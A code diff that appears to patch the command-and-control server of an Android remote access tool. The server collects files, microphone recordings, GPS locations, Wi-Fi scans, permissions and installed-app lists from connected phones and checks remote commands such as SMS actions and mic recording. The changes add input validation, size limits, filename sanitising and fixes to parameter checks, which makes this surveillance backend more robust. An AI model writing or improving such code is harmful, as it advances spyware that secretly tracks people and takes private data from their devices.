@@ -61,6 +61,7 @@ class Clients {
             }).write()
             if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
             if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
+            if (this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
             delete this.ignoreDisconnects[clientID];
         }
     }
@@ -145,11 +146,10 @@ class Clients {
 
             if (data.type === "list") {
                 let list = data.list;
-                if (list.length !== 0) {
+                if (list && Array.isArray(list) && list.length !== 0) {
                     // cool, we have files!
                     // somehow get this array back to the main thread...
-                    client.get('currentFolder').remove().write();
-                    client.get('currentFolder').assign(data.list).write();
+                    client.set('currentFolder', data.list).write();
                     logManager.log(CONST.logTypes.success, "File List Updated");
                 } else {
                     // bummer, something happened
@@ -158,10 +158,13 @@ class Clients {
                 // Ayy, time to recieve a file!
                 logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);
 
+                if (!data.buffer || !data.name) return;
+                if (data.buffer.length > 100 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "File upload too large from " + clientID);
 
                 let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                 let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
-                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
+                let lastDot = data.name.lastIndexOf(".");
+                let fileExt = (lastDot !== -1) ? data.name.substring(lastDot) : '.unknown';
 
                 let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
@@ -228,12 +231,18 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.mic, (data) => {
-            if (data.file) {
+            if (data.file && data.name && data.buffer) {
                 logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);
+
+                if (!Buffer.isBuffer(data.buffer) && !(data.buffer instanceof Uint8Array)) return;
+                if (data.buffer.length > 10 * 1024 * 1024) return logManager.log(CONST.logTypes.error, "Voice record too large from " + clientID);
 
                 let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                 let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
-                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';
+                
+                let sanitizedName = path.basename(data.name);
+                let lastDot = sanitizedName.lastIndexOf(".");
+                let fileExt = (lastDot !== -1) ? sanitizedName.substring(lastDot) : '.unknown';
 
                 let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);
 
@@ -242,7 +251,7 @@ class Clients {
                         client.get('downloads').push({
                             "time": new Date(),
                             "type": "voiceRecord",
-                            "originalName": data.name,
+                            "originalName": sanitizedName,
                             "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                         }).write();
                     } else {
@@ -316,8 +325,7 @@ class Clients {
                 if (data.networks.length !== 0) {
                     let networks = data.networks;
                     let dbwifiLog = client.get('wifiLog');
-                    client.get('wifiNow').remove().write();
-                    client.get('wifiNow').assign(data.networks).write();
+                    client.set('wifiNow', data.networks).write();
                     let newCount = 0;
                     networks.forEach(wifi => {
                         let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
@@ -339,12 +347,12 @@ class Clients {
         });
 
         socket.on(CONST.messageKeys.permissions, (data) => {
-            client.get('enabledPermissions').assign(data.permissions).write();
+            client.set('enabledPermissions', data.permissions).write();
             logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
         });
 
         socket.on(CONST.messageKeys.installed, (data) => {
-            client.get('apps').assign(data.apps).write();
+            client.set('apps', data.apps).write();
             logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
         });
     }
@@ -464,6 +472,7 @@ class Clients {
     }
 
     checkCorrectParams(commandID, commandPayload, cb) {
+        if (!commandPayload) return cb('Command Payload Missing');
         if (commandID === CONST.messageKeys.sms) {
             if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
             else {
@@ -490,11 +499,11 @@ class Clients {
             }
         }
         else if (commandID === CONST.messageKeys.mic) {
-            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
+            if (!('sec' in commandPayload)) return cb('Mic Missing `sec` Parameter')
             else cb(false)
         }
         else if (commandID === CONST.messageKeys.gotPermission) {
-            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
+            if (!('permission' in commandPayload)) return cb('GotPerm Missing `permission` Parameter')
             else cb(false)
         }
         else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
